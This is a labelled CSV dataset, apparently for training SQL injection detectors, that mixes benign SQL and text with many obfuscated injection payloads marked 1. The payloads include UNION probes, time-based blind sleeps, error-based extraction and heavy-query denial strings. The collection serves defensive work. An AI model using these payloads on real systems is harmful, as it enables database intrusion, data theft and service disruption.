Query,Label
SELECT AVG ( line ) FROM equipment,0
"1and	char 	(120 ) 	||char(	106 	) ||char( 117)||char	( 85		)	=	regexp_substring	(		repeat (	right	 (	char	(	 9981  )	,0	),5000000000 	) ,null )#jcdh",1
adolphe,0
47639,0
SELECT Count ( * )  AS official,0
agramontesa,0
"1""	))   	as phiswhere4420= 4420and 3202	=	like('abcdefg',upper	( hex	(		randomblob (500000000/2 )  )	  )	)--",1
"1%'  )	)	 androw	( 	6237,7469 )	>	 (selectcount	(	*		)	,concat ( 0x7171706a71,(	 select	(	elt(	6237 = 6237,1) 		)  )	,0x717a767a71,floor 	(	rand(	0 	)*2		 )		)	xfrom	(  select 5192union	select 3785union	select3931	unionselect 7158	)	agroup by x	)  and	(		 	(  '%'=	'",1
34830,0
barlovento,0
SELECT above FROM palace,0
arima@hormigon-impreso.nu,0
SELECT * FROM slip WHERE husband = 'free'  OR alive = 'did',0
SELECT * FROM want WHERE field LIKE '%farther%',0
1')		and	4386 =utl_inaddr.get_host_address 	(		chr (  113	 )	||chr	(113	 )||chr		( 112	) ||chr ( 	106  )	||chr	 (113)		|| (select	(	 case	when			(	4386=	4386 ) 	then	1else	0end )	from dual  )		||chr	(	113 ) ||chr	(	122  ) ||chr ( 118		)||chr	(	 122	)	||chr(	113 	)   )  and 	('jhlj'	='jhlj,1
SELECT COUNT ( bee ) FROM palace,0
"1%""	 ) )  )		 or9643	= 	 (	select count	(  *	)	 from	domain.domains	as	t1,domain.columns ast2,domain.tablesas	t3 )	and 	 (  	(   ( ""%""		=		""",1
3023,0
SELECT TOP 3 * FROM shot WHERE dry = 'welcome',0
"-3279""union	allselect8568,8568,8568,8568--",1
dawson@eco-pro.to,0
"select	count(  *)		fromrdb$fieldsas t1,rdb$typesast2,rdb$collations	as	t3,rdb$functions	ast4 and		(  ""yobb""	like ""yobb",1
SELECT AVG ( pocket ) FROM air SELECT SUM ( complete ),0
"-6496"" 	)	  )		)			or 1471=	5278and ( ((	""zkoj"" =	""zkoj",1
"SELECT richID AS ID, influence AS rear FROM now",0
3u23pe,0
2.94331E+14,0
SELECT COUNT ( fly ) FROM series,0
"SELECT pond,row FROM native WHERE hold = 'threw' UNION SELECT buffalo, force FROM she",0
"""	)		or	pg_sleep		(	__TIME__	)	 --",1
SELECT * FROM nearly WHERE hang = 'paper'  OR term = 'golden',0
rousseau,0
otxandio,0
SELECT troops ( s )  FROM nation SELECT blue FROM wise,0
san miguel del pino,0
SELECT * FROM forth WHERE missing = 'outer',0
"SELECT * FROM pleasure WHERE dust IN  ( 'desk', 'paragraph', 'famous' )",0
"INSERT INTO gradually ( teeth, surprise, different, visitor, know, habit )  VALUES  ( 'lot', 'floor'. pig', 'cry', 'follow', 'twenty', 'sick' )",0
1 )		 ) 	 orpg_sleep	( __TIME__ ) 	--,1
san bartolom,0
SELECT * FROM join WHERE NOT attached = 'wrong'  AND NOT remove = 'teach',0
"1'	  ) 	) as	ydbt	where 8062 = 8062and 6414	 = ( select	count(	*	) fromrdb$fieldsas	t1,rdb$types	ast2,rdb$collationsas t3,rdb$functions	ast4 )--",1
SELECT musical FROM topic,0
-5217 where	3620 	=3620or	3440  =	cast	( 	(   chr (	 113	) ||chr	( 113 	)	||chr ( 112	) ||chr	( 106)||chr	 (113)   )		 || (	select	(casewhen (3440	=		3440)then 1else0end		)		)::text||	 (	chr(	113  )		||chr(	122 )	 ||chr(118	)		||chr	(122  )  ||chr (		113	 )  )	as	numeric )  --,1
glickman,0
"SELECT ADDDATE ( ""2017-06-15 09:34:21"", INTERVAL -3 HOUR ) ;",0
SELECT * FROM brain WHERE activity NOT LIKE 'bush%',0
"SELECT should, composed+ ', ' + military+ ' ' + cat+ ', ' + teach AS facing  FROM stopped",0
abs hosta,0
SELECT MIN ( mud )  AS parallel FROM around,0
"-9408%"" )  )	 union allselect	1841,1841,1841,1841,1841,1841--",1
"1""where3692	=3692union	allselectnull,null--",1
"iif (	9007	=	3836,1,1/0 )",1
SELECT * FROM discover  WHERE studying = test,0
"1%""	and 9254 =		( select count	(		*	) 		fromrdb$fields ast1,rdb$types as	t2,rdb$collationsast3,rdb$functions	as	t4 )	--",1
8.93682E+15,0
"1'	  )	)		 as umah	where	3781		=	3781	union	all	selectnull,null,null,null#",1
1		)		where1090=	1090 and	6240= 	 	( 'qqpjq'||	( select	case 6240 when6240	then1	else	0	endfromrdb$database	 )	||'qzvzq')	--,1
0x730065006c0065006300740020004000400076006500...,1
select	(	casewhen  ( 	3677 = 2193)then	3677else 1/ (select 0	)	end  )	--,1
SELECT * FROM alone WHERE never BETWEEN act09/01/1996say AND keep15/31/1996meat,0
SELECT COUNT ( giveID ) FROM neighborhood,0
"select*from	users	whereid =  1or	\<\	unionselect1,@@VERSION-- 1",1
"1"" )  	as	gffqwhere4387=	4387 or	extractvalue	 (	1297,concat( 0x5c,0x7171706a71,(	 select	(	 elt	 (1297 = 1297,1 	))	 ),0x717a767a71)  )--",1
0e06u8s17,0
SELECT COUNT ( moonID ) FROM shoulder,0
55585768n,0
select			(		case when  (		7163	= 1777	)then 1else	7163* (	 select7163frommaster..sysdatabases ) end	) --,1
"SELECT paint, swimming, labor FROM wire WHERE closely  IS NULL",0
"callregexp_substring	 ( 	repeat		( right	 (	 char	( 3702),0  ) ,500000000 	)	,null 	) 	and (	 (		( 'leps'like'leps",1
guino osarte,0
"-3249'		) )				) unionallselect 6309,6309#",1
26562587w,0
"1'	 ) )		)	union allselect	null,null,null,null,null--",1
SELECT * FROM buffalo WHERE Price NOT BETWEEN 10 AND 20,0
valdeprados,0
select	*	from users	whereid  =1<@or1	=	 1--	1,1
3.15402E+15,0
armaanzas,0
"1"")   asbllzwhere 6975 =6975 and8148 = 	like	(	 'abcdefg',upper  (hex(	randomblob 	(	500000000/2 	)  )			 ) 	)	 --",1
"SELECT CustomerName, ContactName FROM Customers WHERE  Country  =  ""Brazil"";",0
"1 and elt  (  4249	=4249,7259 ) #lwyo",1
"1'	union all	selectnull,null,null,null,null,null,null,null,null--",1
select	(casewhen	 	(	1776	= 	7688		)	 	then 1776else1/	( select0)	end		) --,1
SELECT TOP 50 PERCENT * FROM across SELECT * FROM agree FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,0
"1""where1982		= 1982",1
SELECT SIGN ( -12 ) ;,0
"1'|| ( select'fbtm'where1335 	=	1335andexp  (	~( 	select*	from 	(select concat ( 0x7171706a71, (	select	(	elt		(	8190 =8190,1)	)	)	 ,0x717a767a71,0x78 )   ) 	 x 		)  ) 		)	||'",1
1'||( 	select'xglm'	fromdual where3556 = 3556	or4240	=(select	4240frompg_sleep	( 5		 )	)--,1
5632,0
grueneic,0
6.96678E+15,0
"SELECT DAYOFYEAR ( ""2017-01-01"" ) ;",0
"1' 	)  )  askgiw where 7452 	= 7452and6510 =	 	(	selectcount(	* 	)  from	sysusers	as	sys1,sysusersassys2,sysusersassys3,sysusersas	sys4,sysusers	as	sys5,sysusersas sys6,sysusersas sys7) --",1
"selectcount (	*)from all_users t1,all_users	t2,all_users t3,all_userst4,all_users t5and	(	 (	 ""soyg""=""soyg",1
"SELECT scaredID AS ID, jungle AS rice FROM carefully",0
werkmeister@19horas.zr,0
5.25502E+15,0
SELECT AVG ( ready ) FROM pure SELECT SUM ( chapter ),0
SELECT * FROM thread WHERE    NOT eleven = 'worse',0
"1""where	6785= 6785and3580=  	 (  selectcount(	*		)		fromdomain.domainsast1,domain.columnsas t2,domain.tablesast3 )--",1
"-9208%"" 	) 	) 	or	8571		=	8571--",1
SELECT * FROM smooth WHERE lungs = 'gone',0
SELECT * FROM suit  WHERE brush = travel,0
lovejoy,0
1'	))  as	txxnwhere7884 =	7884	and3715	in		(		(char ( 113) 	+char  (113 	)	+char (112 )	+char	( 	106	) +char (113	 ) +	( 	select  (	case when  ( 	3715 =	3715 )		thenchar(49 ) else	char(		48	)	 end	))  +char ( 113		)  +char (	122		)+char 	( 118)	+char(122		)+char( 113 		) 	) 	 ) --,1
SELECT COUNT ( rope ) FROM exercise,0
"calle sant joan, 123,",0
calle codigo correspondencia oficial correos-telegrafos 33,0
"1  ) 	) 	 and3202	=  like ('abcdefg',upper (	 hex	(  randomblob ( 500000000/2 	)   ) 	  )	 	)   and (  (	2939		=  2939",1
SELECT * FROM earn,0
"1%"" )	) 	  )   and	sleep	(5	)#",1
"SELECT powder,new,best,such,live     (  (  wrapped JOIN being ON only.tiny =  copy.noise )   INNER JOIN shownON Orders.perfectly =  satisfied.streetID )",0
8.2197E+15,0
"-9152"")	)	as avgawhere	3825	=	 3825	orderby1#",1
11106027v,0
"-3362'where 6567=6567or1 group	by concat(0x7171706a71,	(select		(	 casewhen	(	 4232		=	 4232)then1else0end	 )	) ,0x717a767a71,floor	 ( 	rand	(	 0) 	*2		)	  )   havingmin	 (	0	) #",1
dra2atizar,0
"1'andmake_set	 (8403=8403,8899	)  and	'fttd'like'fttd",1
h?ele77,0
"INSERT INTO automobile ( cry, strange, cost, though, wise, original )  VALUES  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )",0
"SELECT * FROM eat ORDER BY copper, dot",0
"-6520%"") orderby1#",1
2614,0
SELECT * FROM new WHERE cloth = 'daughter'  AND City = 'given',0
SELECT * FROM simplest WHERE warm BETWEEN call09/01/1996ever AND everyone15/31/1996loud,0
"SELECT * FROM right WHERE meant BETWEEN ""cotton"" AND    ""sort""",0
donadieu zanotti,0
"1'	 )	) 	 and exp(  ~ 	(	 select*	from (selectconcat (	0x7171706a71,( select		( elt	 (	8190 =  8190,1	) 	 ) 	)	,0x717a767a71,0x78	) ) x	 ) ) and  	( ('kqqf' =  'kqqf",1
SELECT TOP 3 * FROM load WHERE several = 'film',0
SELECT * FROM receive WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM local ORDER BY pet,0
-4617' )		) 	) or 9323=9323#,1
DELETE FROM union WHERE drew = 'gravity',0
SELECT DISTINCT corner FROM shore,0
"-8409%' ) ormake_set	( 9354=9354,7185 )		and(	 '%'		= '",1
"SELECT * FROM putting ORDER BY thought, nice",0
selles tanari,0
-7164%'or4747	=		dbms_utility.sqlid_to_sqlhash		 ( 	 ( 	chr	 (	 113 )||chr(		113	)||chr(	112 )  ||chr	( 106 	)	||chr( 113 	)	||	 (	select		( casewhen ( 4747	=4747	)  	then 1 else	0end	)  fromdual)  ||chr		(	113  )  ||chr 	( 122	) ||chr(	118	)	||chr(		122 )||chr		( 113		)		) )		and '%'	 = ',1
SELECT * FROM mixture WHERE guard BETWEEN '1996-07-01' AND '1996-07-31',0
62258107m,0
1 ) ) ),1
-5967or	3440 =	cast	 ( 	 (	chr  (113 ) ||chr (	113) 	||chr	( 112	) ||chr  (	106	) ||chr (113  ) 	 ) ||(		select (casewhen( 	3440=  3440 )	 then	1else0end		)  )		 ::text|| (	chr (113 ) ||chr (122		)	||chr	(118	) ||chr (		122)	||chr	(	113	))  asnumeric )	#lhoh,1
bakkum,0
"-3952'	 )	 union	all select6644,6644,6644--",1
SELECT * FROM  ( SELECT seen FROM see ),0
"-6928"" )		)   or3440 	=cast	( ( chr		( 113) ||chr	 ( 113	)  ||chr( 112 ) ||chr(	106 )||chr 	(	113	 ) 	  ) ||	(  select 	(	case	when  (	3440=		3440 )	then	1 else0end 	)		 	)		::text|| ( chr (113	 )  ||chr	(122	 ) ||chr	( 118		)||chr	(	122		) ||chr	 (113)				)		asnumeric) 	 and	 (		 	(  ""mxhr""like""mxhr",1
1'+ ( selecttdktwhere	4535= 4535,1
"1' ) and5556	 =	 	(	select	count( *	)	fromall_users	t1,all_users t2,all_users	t3,all_userst4,all_userst5  )",1
moriego,0
"-4127%'	unionallselect 9558,9558,9558#",1
50159319e,0
"-4797'union	all select8223,8223,8223,8223,8223,8223,8223,8223#",1
"-3209'+	(select ldum	where	9912=		9912	unionall	select9912,9912,9912,9912#",1
SELECT * FROM  ( SELECT development FROM traffic ),0
SELECT * FROM read WHERE slightly = 'remember' FETCH FIRST 3 ROWS ONLY,0
yamile de francisco,0
"-3361where1335= 1335	orelt(	 5891	 =5092,5092		)  --",1
"cuesta de la baronesa, 192",0
cabot camaran,0
houstin@maxitienda.zr,0
1'||	 (  select	'bhxx'where2585 =		2585,1
SELECT TOP 3 * FROM certainly,0
"1'	where 1031=	1031orchar(68  )||char	(	69	 )||char 	( 97 ) ||char(85		)  	 = regexp_substring  (	repeat (	 right	 ( char	(	5389  ) ,0	)	,5000000000	)  ,null ) 	--",1
"waitfor delay	'0:0:5'	and ""%"" 	= """,1
"1""		)	where5814= 5814	and	6969=	(	select 6969	from pg_sleep(5	) 	)	 --",1
SELECT COUNT ( author ) FROM bear,0
dehr,0
"1'	in boolean mode)  andextractvalue ( 7982,concat	 (	0x5c,0x7171706a71,	( select  ( elt	 (	7982	= 7982,1)		))	,0x717a767a71 )			)	#",1
1' )  )	 aslkse where 9951	=  9951,1
"1"" )	)aswfne	where8933	= 	8933",1
"1',iif(7475	 =7475,1,1/0  )",1
1%')		 )	   )		and3916 =		6327--,1
7106,0
2308,0
SELECT AVG ( car )  FROM tea  SELECT SUM ( this ),0
4ino57l,0
1s,1
"c/ leopoldo alas ""clarin"" 4, 6?b",0
1o92r,0
"SELECT BINARY ""HELLO""  =  ""hello"";",0
"SELECT * FROM finish ORDER BY cow, sound",0
yarela,0
"SELECT COUNT ( cup ) , ate FROM number BY sugar",0
SELECT * FROM herself WHERE    NOT gas = 'loud',0
SELECT * FROM function  WHERE object = end,0
"1' 	) and6537= 	dbms_pipe.receive_message  ( chr ( 	76	) ||chr (116	 )	||chr	(117 )||chr	(65 )	,5 )and ( 	'rgue'like'rgue",1
"manzano, el",0
"-7514%"" 	)	)		)	or2448	=8797#",1
"-2384%' ) )   unionall select 2467,2467,2467,2467#",1
"1""	 )	where5794	= 5794unionall selectnull,null,null,null,null,null,null,null,null,null#",1
UPDATE noun SET else = 'negative'WHERE late = 'audience',0
1'		 ) 	)				and4386  =  utl_inaddr.get_host_address  (	chr(	113	)||chr		(113)  ||chr (	112	)	||chr( 106	)||chr	(113)|| (	select	 (case	when (	4386 =4386) 	 then	1else	0	end	)	 fromdual	) ||chr(113) 	||chr  (	122)	||chr	 (  118  )	||chr	(		122 ) ||chr(	113	) 	)		 and	 (  (	'foop'	like	'foop,1
SELECT MIN ( twelve )  AS printed FROM automobile,0
"1' )		 ) 		)		or	char	( 	117)		||char (111 ) ||char	(	 105)	||char	( 100 ) 	=	regexp_substring  ( repeat	(	 left 	(crypt_key (	 char	 (	65)  ||char (	69) ||char 	( 	83 	),null)	 ,0	),500000000  )	,null	)	 and	(		( 		('akyc'= 	'akyc",1
"SELECT * FROM sets ORDER BY torn ASC, cat DESC",0
SELECT TOP 50 PERCENT * FROM walk SELECT * FROM shelf FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM proud,0
SELECT bare FROM spell,0
"1 )  	as lhie where 4631=	4631 union allselect null,null,null,null,null--",1
"SELECT wp_posts.* FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id AND wp_postmeta.meta_key  =  'fave_agent_visible'  )  LEFT JOIN wp_postmeta AS mt1 ON  (  wp_posts.ID  =  mt1.post_id  )  WHERE 1 = 1 AND wp_posts.ID NOT IN  ( 28313,28341 )  AND  (  wp_postmeta.post_id IS NULL OR  (  mt1.meta_key  =  'fave_agent_visible' AND CAST ( mt1.meta_value AS SIGNED )  ! =  '1'  )   )  AND wp_posts.post_type  =  'houzez_agent' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262327 )  ORDER BY meta_id ASC",0
SELECT * FROM something ORDER BY earth,0
SELECT * FROM map  WHERE depth = leather,0
select *fromuserswhere	id =	1	+$+.or1= 	1 --	1,1
selectcasewhen 3920=	4402	then 1else null	end--,1
"1""	)  and char  ( 120)	||char (	106	)	||char	(	117)	||char	(85) 	 =regexp_substring	( repeat	( right	(		char		(	9981		)	,0) 	,5000000000)	,null	)	  and( ""lsca""like""lsca",1
SELECT * FROM grown WHERE automobile = 'milk'  OR control = 'wild',0
"-3433'	)where8307=	8307union	allselect 8307,8307,8307,8307,8307,8307,8307,8307--",1
roca,0
SELECT * FROM letter WHERE too BETWEEN 'slabs' AND 'ten',0
"1'where7353 =	7353or8156=		 (	select count( * 	)	 from	generate_series (1,5000000		) ) 		--",1
"SELECT pretty, friend, successFROM wait WHERE independent  IS NOT NULL",0
15873,0
"-1748%"")		 )  )	 unionallselect 2987#",1
"INSERT INTO apple ( difference, bat, jungle, including, circle, today )  VALUES  ( 'title', 'repeat'. end', 'let', 'floating', 'explore', 'tax' )",0
46562846j,0
"1'and	6510=	  (select count(  *	) fromsysusersassys1,sysusersas	sys2,sysusers	as sys3,sysusers as sys4,sysusersas	sys5,sysusersassys6,sysusers	assys7 )	and'eqle'	 =	'eqle",1
"1%"")	 )			)and exp(~ ( select*from (selectconcat 	(0x7171706a71,	(	 select  ( elt	( 8190 = 	8190,1	) 	  )  ),0x717a767a71,0x78))	x	 )			)	  and ( 		 ( 	( 	""%""	= """,1
select (  case when (1946= 1302 ) then1946	else 1/ ( 	select	0) end	 )		--,1
SELECT TOP 3 * FROM gray WHERE tropical = 'son',0
"select* fromuserswhereid	=  1or \.<$union select 1,@@VERSION --1",1
SELECT knowledge ( s )  FROM longer SELECT create ( s ),0
mandruso,0
Ã¢ÂÂor3	=	3--,1
1	)where 6035	= 	6035,1
16340,0
"1'	)		asidqc	where5288		=5288andelt(  1210	= 1210,sleep (  5	)			)--",1
syamala,0
SELECT AVG ( instance ) FROM spite,0
SELECT TOP 3 * FROM keep SELECT * FROM nearby 3SELECT * FROM improve,0
1' ) waitfordelay'0:0:5'and  (	'peyv' like'peyv,1
1 rlike  (	select	( case when  ( 8911 =  5301	) 	then 1 else0x28end ) ) 	#pmuh,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 30696 )  ORDER BY meta_id ASC",0
SELECT COUNT ( DISTINCT no )  FROM there,0
"1'	or9643=	(	select	count  (*  )	from domain.domains	ast1,domain.columnsas t2,domain.tablesas t3 	) and	'bwrb'	like'bwrb",1
"SELECT * FROM spite WHERE strong IN  ( 'blood', 'ancient', 'slight' )",0
SELECT * FROM popular WHERE broke = 'thou' FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 50 PERCENT * FROM officer SELECT * FROM single FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM move,0
SELECT dirty ( s )  FROM search SELECT who FROM think,0
niembro urkiaga,0
"-1051""	)	where6586= 6586or	6647 =	6738#",1
SELECT * FROM belong WHERE tight = 'bow' FETCH FIRST 3 ROWS ONLY,0
\'; desc users;--,1
quint,0
SELECT MIN ( spell )  AS paid FROM essential,0
"-2414%"") or elt	 (		1032=	1032,3623)and 	(""%""  =	""",1
DELETE FROM room,0
f3ac76025,0
"1 )	where 7978	=	7978 or	7427=dbms_pipe.receive_message ( chr ( 116 )||chr ( 87)||chr	(  90	)||chr (109		),5	)	--",1
"SELECT three AS halfway, pipe AS [burn]  FROM fallen",0
tiramollar,0
"-1908""		 ) )	 union all select4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",1
"-3441' ) 	 )		as	dxvtwhere9291	 =	9291 unionallselect9291,9291,9291#",1
"-6659' )	 where1256	=1256	union all	select1256,1256--",1
1%',1
SELECT COUNT ( apart ) FROM pole,0
select *from users where	id	= 1 +	\+%\or	1 	=1	--	1,1
36930027p,0
sant llus,0
areces casallac,0
( 	select* from	(select	( sleep(5			)) 		)srmq  ) and  ( 'kerg'like 'kerg,1
SELECT * FROM wing WHERE captain = 'man' LIMIT 3,0
ge2613an0,0
SELECT * FROM football,0
"SELECT clearly, popular, stoveFROM clear WHERE excited  IS NOT NULL",0
"1""where 4319 	=	4319",1
2252,0
SELECT COUNT ( facing )  FROM gray,0
"-2027%"" 	) union	all	select	2048,2048,2048,2048,2048,2048,2048,2048#",1
%2A%28%7C%28objectclass%3D%2A%29%29,1
SELECT * FROM building WHERE shallow = 'aloud' FETCH FIRST 3 ROWS ONLY,0
229i9967te,0
SELECT * FROM think WHERE consist = 'face',0
"select *	from	userswhere	id	= 	1 union select+!<@,version(	 )		--1",1
SELECT * FROM wp_posts WHERE ID  =  262331 LIMIT 1,0
"SELECT past,shallow,giving,shot,entirely     (  (  control JOIN arrange ON been.main =  short.courage )   INNER JOIN stageON Orders.ought =  bottom.dozenID )",0
"-2448%"") 	 or 3038= 	3038",1
"SELECT * FROM consonant WHERE follow IN  ( 'opinion', 'copy', 'lunch' )",0
for26same8te,0
"1'	)asyhgkwhere9246  =		9246	andchar ( 120 	)  ||char 	( 	106)	||char(	 117 	) ||char		( 85) 			= regexp_substring ( 	repeat(	 right( char( 9981 	) ,0 )	,5000000000 ) 	,null) --",1
SELECT TOP 3 * FROM split SELECT * FROM explore 3SELECT * FROM tie,0
"-6084'		)		) 			or 1570=convert	(	 int,		( selectchar  ( 113 ) +char	 (	113)	 +char	 (	112)	 +char	(	106)	+char 	(	 113 )  +	( select	( casewhen (	 1570  =	1570	 )	 	then char	(  49	 )	elsechar	(	48  )  end)  )  +char	(113)+char( 	122 )	 +char (	118	) +char(	122)+char  ( 113  )	)		 )and (  ('dfcp'='dfcp",1
"1""	and  ( 3020	= 	3020 ) *6703	and	""tnzp""like ""tnzp",1
bellaguarda,0
1'|| (	select 'rdqv'fromdual	where1894		=	 1894,1
1'+	(selecthkrgwhere3665  =	3665,1
SELECT * FROM treated WHERE motor = 'slight'  AND  ( accept = 'sink' OR read = 'leave' ),0
coe,0
"INSERT INTO help ( grandfather, lungs, trail, time, closer, tongue )  VALUES  ( 'mistake', 'means'. surprise', 'outer', 'porch', 'beside', 'captain' )",0
wailing@mariposasentudia.je,0
"SELECT * FROM fallen WHERE whistle IN  ( 'strip', 'herself', 'direction' )",0
"1"" )	 	where8407=8407 and	9254	=	 (		select count  ( *	 ) fromrdb$fieldsast1,rdb$types	ast2,rdb$collationsas	t3,rdb$functionsast4	) 	--",1
SELECT purple FROM grabbed UNION SELECT tea FROM careful ORDER BY character,0
1'	)  union	allselect	null--,1
"1'||		( select'cozi'	from dualwhere 2607= 2607	and 9660 =	 (	selectcount (* )	from all_userst1,all_users	t2,all_users	t3,all_users	t4,all_userst5  )--",1
"SELECT Employees.solution, COUNT ( Orders.braveID )  AS fromFROM    ( OrdersINNER JOIN limited ON Orders.hisID  =  Employees.boundID )",0
SELECT * FROM driver,0
SELECT COUNT ( essential ) FROM jack,0
SELECT angle ( s )  FROM identity FULL OUTER JOIN,0
"UPDATE pattern SET somehow =  'take', City =  'unhappy' WHERE avoid =  grass",0
SELECT * FROM lamp,0
gaetano,0
"SELECT customername, contactname FROM customers; ALTER TABLE Customers ADD Email varchar ( 255 ) ; ALTER TABLE Customers DROP COLUMN Email; DROP TABLE Shippers;  TRUNCATE TABLE Categories;",0
"1"")		or	5356	=(selectcount		(	*	) from sysusers	as sys1,sysusers assys2,sysusersas sys3,sysusers assys4,sysusersas	sys5,sysusersassys6,sysusers assys7	 ) --",1
"1""	and3824 =benchmark (	5000000,md5 (0x76555642 	 )  )",1
"1) 	 as	zelk	where 1944=	1944 orchar(117	 )||char(111		)||char (105) ||char 	(100 )	=regexp_substring (		repeat(	left(	crypt_key  (	char(65)  ||char 	( 69	)	||char	 (	83	 )	,null 	)	,0)	 ,500000000	),null  )--",1
-5830' 	)		asfivy where	2173=  2173 or	5903=   ('qqpjq'|| 	(select case 5903when 5903then1	else0endfromrdb$database ) ||'qzvzq' ) --,1
pawley@santacruzdelvoto.vu,0
"SELECT strawID AS ID, arrive AS if FROM alphabet",0
"1""  )	)	  		)	and7533= 	7533and		(	 ( 	(	""alvd"" like ""alvd",1
olivares,0
522lta,0
SELECT MIN ( smell )  AS party FROM medicine,0
"UPDATE partly SET safety =  'shape', City =  'raise' WHERE throughout =  same",0
"1	)	asocut	where 6800=6800and elt ( 4249	 =	4249,7259 )	--",1
SELECT COUNT ( plates ) FROM needed,0
1%'and 4595	= 4595#,1
"1"")  )		andelt (	1210=	1210,sleep 	(	5	)	 ) and  (		(		""utlk""	like	""utlk",1
trish,0
21710,0
vries,0
gwenda,0
"select	sleep		(	5	) 	and	 	(	 	( 	 ( ""zlal""=""zlal",1
"SELECT noiseID AS ID, paint AS exactly FROM parts",0
"1' where6721 = 6721union all	select	null,null,null,null,null,null,null,null,null,null#",1
"SELECT cap, meal, hungry FROM captured WHERE pony  IS NULL",0
stavro,0
"iif (		1217=8831,1,1/0 )",1
"SELECT * FROM above WHERE lips IN  ( 'adult', 'decide', 'our' )",0
SELECT * FROM affect,0
7s0av07rido,0
SELECT EXP ( 2 ) ;,0
r4a8e3a,0
"SELECT wood, hardly+ ', ' + mental+ ' ' + poor+ ', ' + getting AS diagram  FROM vast",0
"-6431"" ) ) unionallselect2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",1
SELECT * FROM mouse 3 SELECT * FROM force,0
"-9859"" )		)  )  unionallselect6595,6595,6595,6595,6595,6595,6595#",1
SELECT shelf ( s )  FROM none UNION ALL,0
"calle juana ibarborou 134,",0
select sleep 	( 5		)   and 	(4863		= 	4863,1
"1"" or 4411		=	 (  selectcount(	*	)	from sysusersas	sys1,sysusersas sys2,sysusersassys3,sysusers as sys4,sysusers	as sys5,sysusers assys6,sysusers assys7		)",1
SELECT * FROM substance FETCH FIRST 50 PERCENT ROWS ONLY,0
28413,0
select(  case	when	(	4059	 =  7807	)	then	4059else 1/	( select 0	)  end)	--,1
"1%'		 ) ) 		) and4241 	= convert		( int, (	select char	 (	113)+char	 ( 	113	)	+char  (  112		)	 +char ( 106		)+char(113 )+ (	select 	(case	when	 ( 4241= 4241)		then char (	 49) else	char		( 48 ) end)  )	+char  (113 )+char  (122)	+char  ( 	118  )	 +char (	122 ) +char ( 113		) 	) 		)and	   (	 (   ( '%'	= '",1
SELECT AVG ( milk ) FROM than,0
1'	)  where7629=		7629rlike	(select* from  (select	(  sleep	( 5	)	  ) 	)	vwyq )	 #,1
1	)	as wshv where5684 =	5684,1
methi,0
SELECT * FROM else FETCH FIRST 50 PERCENT ROWS ONLY,0
"1""	) 		asdien	where 4022 	= 4022",1
praxila,0
SELECT * FROM long WHERE examine = 'log',0
1		)  ) aswrhe where6120 	=	6120 and	6240	=  (	'qqpjq'|| (selectcase6240when	6240then	1else	0end fromrdb$database) ||'qzvzq'	) --,1
8230,0
"select*from	users whereid  =		1	or "";{""	or 1= 	1	--1",1
"1"")) 	)	(	select 	(	case	when	  ( 	5451 =5451  )  	thenregexp_substring(	repeat ( right( 	char	 (5451 )	,0	)	,500000000	 )	 ,null)	else char	(  108 	)||char	(76	) 	||char	(		112 )	||char (	116)   end	)		frominformation_schema.system_users  ) and  	(  ( 	 ( ""znzb""like""znzb",1
-9148 ) where2027= 2027or8571 =  8571--,1
pobladura de pelayo garca,0
"SELECT column_name ( s )  FROM natural,brother",0
"SELECT windowID AS ID, plus AS passage FROM frozen",0
jarad,0
"1%'	)	)			) or5286	=	(selectcount (	*	) from all_users	t1,all_userst2,all_userst3,all_users t4,all_users t5 ) and   (	(   (	'%'		=	'",1
"select *from	userswhere id ='1' union	select""[""_,version(	 )  	--1'",1
"1%' )  or7417		= (select	count(  * )		fromsysibm.systables ast1,sysibm.systablesast2,sysibm.systables	ast3 	) --",1
SELECT TOP 3 * FROM wave SELECT * FROM tribe 3SELECT * FROM football,0
